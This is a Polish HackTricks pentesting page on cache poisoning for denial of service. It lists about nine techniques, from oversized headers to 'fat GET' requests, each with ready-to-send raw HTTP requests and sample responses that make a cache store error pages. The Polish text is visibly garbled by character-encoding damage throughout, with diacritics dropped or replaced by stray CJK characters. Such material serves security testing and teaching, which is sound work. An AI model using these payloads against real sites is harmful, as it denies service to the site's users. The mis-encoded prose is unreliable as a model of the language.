# Zatrucie pamici podrcznej w celu DoS

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakowania, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na githubie.

</details>

{% hint style="danger" %}
Na tej stronie znajdziesz r贸偶ne warianty pr贸b spowodowania, 偶e **serwer WWW odpowie bdami** na 偶dania, kt贸re s **wa偶ne dla serwer贸w pamici podrcznej**
{% endhint %}

* **Zbyt du偶y nag贸wek HTTP (HHO)**

Wylij 偶danie z rozmiarem nag贸wka wikszym ni偶 obsugiwany przez serwer WWW, ale mniejszym ni偶 obsugiwany przez serwer pamici podrcznej. Serwer WWW odpowie bdem 400, kt贸ry mo偶e zosta zapisany w pamici podrcznej:
```
GET / HTTP/1.1
Host: redacted.com
X-Oversize-Hedear:Big-Value-000000000000000
```
* **Znaki meta znacznik贸w HTTP (HMC) i Nieoczekiwane wartoci**

Wylij nag贸wek zawierajcy **szkodliwe znaki meta** takie jak `\n` i `\r`. Aby atak zadziaa, musisz najpierw omin pami podrczn.
```
GET / HTTP/1.1
Host: redacted.com
X-Meta-Hedear:Bad Chars\n \r
```
Niepoprawnie skonfigurowany nag贸wek m贸gby by po prostu `\:` jako nag贸wek.

To r贸wnie偶 mo偶e dziaa, jeli zostan wysane nieoczekiwane wartoci, takie jak nieoczekiwany Content-Type:
```
GET /anas/repos HTTP/2
Host: redacted.com
Content-Type: HelloWorld
```
* **Nag贸wek bez klucza**

Niekt贸re strony internetowe zwr贸c kod stanu bdu, jeli **zobacz pewne konkretne nag贸wki** w 偶daniu, na przykad z nag贸wkiem _X-Amz-Website-Location-Redirect: someThing_.
```
GET /app.js HTTP/2
Host: redacted.com
X-Amz-Website-Location-Redirect: someThing

HTTP/2 403 Forbidden
Cache: hit

Invalid Header
```
* **Atak podmiany metody HTTP (HMO)**

Jeli serwer obsuguje zmian metody HTTP za pomoc nag贸wk贸w takich jak `X-HTTP-Method-Override`, `X-HTTP-Method` lub `X-Method-Override`. Mo偶liwe jest 偶danie poprawnej strony zmieniajc metod, kt贸r serwer nie obsuguje, co skutkuje zapisaniem zej odpowiedzi w pamici podrcznej:
```
GET /blogs HTTP/1.1
Host: redacted.com
HTTP-Method-Override: POST
```
* **Niezaszyfrowany port**

Jeli port w nag贸wku Host jest odzwierciedlany w odpowiedzi i nie jest uwzgldniony w kluczu pamici podrcznej, mo偶na go przekierowa na nieu偶ywany port:
```
GET /index.html HTTP/1.1
Host: redacted.com:1

HTTP/1.1 301 Moved Permanently
Location: https://redacted.com:1/en/index.html
Cache: miss
```
* **Duga przekierowanie DoS**

Tak jak w poni偶szym przykadzie, x nie jest buforowany, wic atakujcy m贸gby nadu偶y zachowania odpowiedzi przekierowania, aby sprawi, 偶e przekierowanie wyle tak du偶y adres URL, 偶e zwr贸ci bd. W rezultacie osoby pr贸bujce uzyska dostp do adresu URL bez klucza x niebuforowanego otrzymaj odpowied藕 bdu:
```
GET /login?x=veryLongUrl HTTP/1.1
Host: www.cloudflare.com

HTTP/1.1 301 Moved Permanently
Location: /login/?x=veryLongUrl
Cache: hit

GET /login/?x=veryLongUrl HTTP/1.1
Host: www.cloudflare.com

HTTP/1.1 414 Request-URI Too Large
CF-Cache-Status: miss
```
* **Normalizacja wielkoci liter w nag贸wku Host**

Nag贸wek hosta powinien by nieczuy na wielko liter, ale niekt贸re strony internetowe oczekuj, 偶e bdzie on pisany maymi literami, zwracajc bd, jeli nie jest:
```
GET /img.png HTTP/1.1
Host: Cdn.redacted.com

HTTP/1.1 404 Not Found
Cache:miss

Not Found
```
* **Normalizacja cie偶ki**

Niekt贸re strony zwr贸c kody bd贸w, wysyajc dane URLencode w cie偶ce, jednak serwer pamici podrcznej zdekoduje adres URL i przechowa odpowied藕 dla zdekodowanej cie偶ki:
```
GET /api/v1%2e1/user HTTP/1.1
Host: redacted.com


HTTP/1.1 404 Not Found
Cach:miss

Not Found
```
* **Fat Get**

Niekt贸re serwery cache, takie jak Cloudflare, lub serwery internetowe, blokuj 偶dania GET z ciaem, wic mo偶na to wykorzysta do zcache'owania nieprawidowej odpowiedzi:
```
GET /index.html HTTP/2
Host: redacted.com
Content-Length: 3

xyz


HTTP/2 403 Forbidden
Cache: hit
```
## Odnoniki

* [https://anasbetis023.medium.com/dont-trust-the-cache-exposing-web-cache-poisoning-and-deception-vulnerabilities-3a829f221f52](https://anasbetis023.medium.com/dont-trust-the-cache-exposing-web-cache-poisoning-and-deception-vulnerabilities-3a829f221f52)
* [https://youst.in/posts/cache-poisoning-at-scale/?source=post\_page-----3a829f221f52--------------------------------](https://youst.in/posts/cache-poisoning-at-scale/?source=post\_page-----3a829f221f52--------------------------------)

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Kup [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakowania, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
